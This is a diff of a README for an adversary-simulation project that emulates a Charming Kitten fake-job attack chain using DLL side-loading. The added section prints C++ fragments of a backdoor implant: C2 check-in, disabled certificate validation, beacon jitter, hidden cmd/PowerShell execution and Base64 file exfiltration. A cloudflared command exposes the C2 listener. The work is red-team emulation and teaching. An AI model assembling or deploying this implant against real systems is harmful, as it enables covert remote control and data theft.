@@ -4,8 +4,6 @@ This is a simulation of attack by (Charming Kitten) APT group targeting the aero
 
 <img width="696" height="433" alt="imageedit_3_8766952404" src="https://github.com/user-attachments/assets/7f1b3742-ba5a-4d0a-8c5c-4d38b9a71b21" />
 
-
-
 Throughout, the malware hides behind legitimate applications and cloud services to dodge static and dynamic detection, and the overall chain emphasizes low-noise execution with strong anti-analysis tricks built into the payload. This progression — LinkedIn recruiter lure → fake job website (careers2find[.]com) → malicious ZIP (SignedConnection[.]zip) → DLL Side-Loading (secur32.dll) → SnailResin malware → cloud-based C2 — shows Charming Kitten's shift toward more resilient, custom-built modular tooling and deliberate misattribution (mimicking North Korean Lazarus) in recent campaigns targeting aerospace and defense sectors.
 
 ![Charming Kitten Dream Job Attack Chain](https://quickchart.io/graphviz?graph=digraph%20G%20%7B%20rankdir%3DLR%3B%20node%20%5Bshape%3Dbox%2C%20style%3D%22rounded%2Cfilled%22%2C%20fontname%3D%22Arial%22%5D%3B%20A%5Blabel%3D%22LinkedIn%20Fake%20Recruiter%22%2C%20fillcolor%3D%22%23ffcccc%22%5D%3B%20B%5Blabel%3D%22Fake%20Job%20Site%5C%2C%20careers2find.com%22%2C%20fillcolor%3D%22%23ffcccc%22%5D%3B%20C%5Blabel%3D%22SignedConnection.zip%22%2C%20fillcolor%3D%22%23ffcccc%22%5D%3B%20D%5Blabel%3D%22SignedConnection.exe%22%2C%20fillcolor%3D%22%23ccffcc%22%5D%3B%20E%5Blabel%3D%22Malicious%20secur32.dll%22%2C%20fillcolor%3D%22%23ffcccc%22%5D%3B%20F%5Blabel%3D%22SnailResin%20Malware%22%2C%20fillcolor%3D%22%23ffcccc%22%5D%3B%20G%5Blabel%3D%22api.ipify.org%22%2C%20fillcolor%3D%22%23ccffcc%22%5D%3B%20H%5Blabel%3D%22GitHub%20README.html%22%2C%20fillcolor%3D%22%23ccffcc%22%5D%3B%20I%5Blabel%3D%22C2%20xboxapicenter.com%22%2C%20fillcolor%3D%22%23cce5ff%22%5D%3B%20J%5Blabel%3D%2289.221.225.249%22%2C%20fillcolor%3D%22%23cce5ff%22%5D%3B%20A-%3EB-%3EC-%3ED-%3EE-%3EF%3B%20F-%3EG%3B%20F-%3EH%3B%20H-%3EI-%3EJ%3B%20%7D)
@@ -100,7 +98,6 @@ The listener configuration established the communication parameters required for
 
 <img width="1366" height="688" alt="Screenshot From 2026-10-26 07-37-42" src="https://github.com/user-attachments/assets/020276aa-5841-425b-8aba-e0c5b3de5738" />
 
-
 We executed the following command to expose the local HTTPS listener through a temporary Cloudflare Tunnel:
 cloudflared tunnel --url https://localhost:443 --no-tls-verify
 The command created a publicly accessible HTTPS tunnel URL that forwarded incoming traffic to the local service listening on port 443. The generated URL was then used as the externally reachable endpoint for the subsequent connectivity test.
@@ -110,20 +107,151 @@ This configuration allowed us to test external reachability without configuring 
 <img width="1354" height="409" alt="Screenshot From 2026-10-26 07-15-10" src="https://github.com/user-attachments/assets/50b6fce9-75f3-4c41-a323-1dddedfc5a4f" />
 
 After configuring the listener and establishing the Cloudflare Tunnel, we opened the BEAR-C2 Payload Generator and configured the payload parameters.
+
 The configuration referenced the externally reachable tunnel hostname, port 443, and the URI /support/troubleshoot. The payload was configured as a DLL file using the HTTPS network protocol and the previously generated Beacon Authentication ID.
 
 <img width="1366" height="734" alt="Screenshot From 2026-10-26 07-39-26" src="https://github.com/user-attachments/assets/0604e71c-1372-4f77-819b-36ee9da459cd" />
 
 
+***
+
+
+### `secur32.dll` (The Backdoor)
+
+The `secur32.dll` is the final backdoor dropped by the `SignedConnection.exe` loader. It is a fully functional, custom C++ implant designed to provide remote control over the victim's machine via a custom HTTPS implementation.
+
+Here is a breakdown of what happens inside the code:
+
+### 1. HTTPS C2 Communication (SSL Evasion)
+Unlike standard malware that might be blocked by strict certificate checks, this implant uses the Windows `WinINet` API with deliberate security bypasses to ensure it can communicate with the attacker's self-signed or fake HTTPS server without throwing errors.
+
+```cpp
+DWORD flags = INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
+              INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
+              INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
+              INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
+              INTERNET_FLAG_NO_CACHE_WRITE |
+              INTERNET_FLAG_SECURE;
+
+if (!VERIFY_SSL) {
+    flags |= INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
+             INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
+}
+
+HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(), NULL, NULL, NULL, flags, 0);
+```
+
+### 2. Check-in and JSON Tasking
+Upon execution, the DLL enters a `main_loop()`. It begins by sending a `checkin` request to the C2. It sends a hardcoded `AUTH_ID` to identify itself. The C2 responds with a JSON payload containing a session ID (`sid`), User-Agent strings (`ua`), sleep times (`sl`), and jitter values (`sj`, `ej`). This allows the attacker to dynamically control how often the malware beacons.
+
+```cpp
+bool checkin() {
+    try {
+        string payload = "{\"action\":\"checkin\",\"token\":\"" + json_escape(AUTH_ID) + "\"}";
+
+        string response = http_request(get_url(), "POST", payload, get_request_headers(true));
+        if (response.empty()) {
+            return false;
+        }
+
+        if (response.find("\"sid\"") == string::npos) {
+            return false;
+        }
+
+        session_id = get_json_value(response, "sid");
+        if (session_id.empty()) {
+            return false;
+        }
+        
+        // ... parsing other config (ua, sj, ej, sl, etc.) ...
+```
+
+### 3. Anti-Analysis: Jitter and Sleep
+To avoid detection by EDR systems that look for constant, regular beaconing, the code uses an `apply_jitter()` function. It takes the base sleep time and adds a random number of milliseconds based on the values received from the C2. It ensures the sleep time stays between 10 seconds and 15 minutes.
+
+```cpp
+void apply_jitter() {
+    if (start_jitter > end_jitter) swap(start_jitter, end_jitter);
+    static random_device rd;
+    static mt19937 gen(rd());
+    uniform_int_distribution<> dis(start_jitter, end_jitter);
+    int jitter_amount = dis(gen);
+    double final_sleep = sleep_time + jitter_amount;
+    final_sleep = max(10.0, min(900.0, final_sleep));
+    this_thread::sleep_for(chrono::milliseconds((int)(final_sleep * 1000)));
+}
+```
+
+### 4. Remote Command Execution (CMD & PowerShell)
+The implant polls the C2 for tasks. If a command is received, it is routed to specific functions. It creates an anonymous pipe and spawns a hidden `cmd.exe` or `powershell.exe` process (`CREATE_NO_WINDOW`), captures the output, and returns it to the attacker.
+
+```cpp
+// Spawning hidden CMD
+string full_cmd = "cmd.exe /c " + cmd;
+vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
+cmd_line.push_back('\0');
+
+BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
+                              CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
+
+// ... Reading the output ...
+while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
+    buffer[bytesRead] = '\0';
+    result += buffer;
+}
+```
+
+### 5. File System Interaction & Exfiltration
+The payload includes native C++ functions (using `std::filesystem`) to interact with the victim's disk without relying on CMD. For example, the `download_file` function reads a file into a binary stream, Base64-encodes it, and formats it for C2 exfiltration.
+
+```cpp
+string download_file(const string& filepath) {
+    // ... checks if file exists ...
+    ifstream file(filepath, ios::binary);
+    // ... reads file data ...
+    vector<unsigned char> file_data((istreambuf_iterator<char>(file)), 
+                                    istreambuf_iterator<char>());
+    file.close();
+    
+    string filename = std::filesystem::path(filepath).filename().string();
+    size_t filesize = file_data.size();
+    string encoded = base64_encode(string((char*)file_data.data(), file_data.size()));
+    
+    return "file-data:" + filename + "|" + to_string(filesize) + "|" + encoded;
+}
+```
+
+### 6. Custom JSON Parser
+To avoid relying on large third-party libraries, the malware includes a lightweight, custom-built `Json` class. It is capable of parsing the C2's responses, extracting values like `"sid"`, `"command"`, and `"out"`, and escaping/unescaping strings to ensure the data is transmitted correctly without breaking the JSON format.
+
+**Original Code Snippet:**
+```cpp
+class Json {
+private:
+    enum Type { JSON_NULL, JSON_OBJECT, JSON_ARRAY, JSON_STRING, JSON_BOOL, JSON_NUMBER };
+    Type type;
+    map<string, Json> object_value;
+    // ...
+public:
+    // ... constructors ...
+    string dump(int indent = 0) const {
+        if (type == JSON_STRING) return "\"" + escape(string_value) + "\"";
+        // ... handles parsing of objects and arrays ...
+    }
+};
+```
+
 ## The third stage (Signed-Connection.exe malware)
 
 We created a Windows application made up of two main files: SignedConnection.exe and secur32.dll.
 The EXE shows a fake job-related login screen. The credentials given to the victim are part of the trick and are not needed for the behavior we are studying.
+
 The EXE checks a website before it continues running. If the check fails, it tries to load the DLL. The DLL is the main file we are studying because it is linked to the next stage of execution and C2 communication.
 
 <img width="1130" height="692" alt="Screenshot From 2026-10-26 07-45-37" src="https://github.com/user-attachments/assets/25b19b9e-ee51-4f34-8dff-2d533725a4a6" />
 
 ### Application Startup
+
 The EXE acts as the main application and starts the DLL-loading process. When the program starts, it follows these steps:
 1. Checks if a configured website responds.
 2. Exits if the website check succeeds.
@@ -175,7 +303,6 @@ Reference: Lazarus Group — Adversary Simulation Repository (https://github.com
 The final and most sophisticated capability is C2 communication over HTTPs, allowing the implant to receive commands and exfiltrate data.
 
 <img width="1280" height="561" alt="photo_2026-10-26_08-27-08" src="https://github.com/user-attachments/assets/e5df5869-3fe2-4ce1-ab0b-e23ab825d000" />
-
 
 
 ## MITRE ATT&CK Techniques
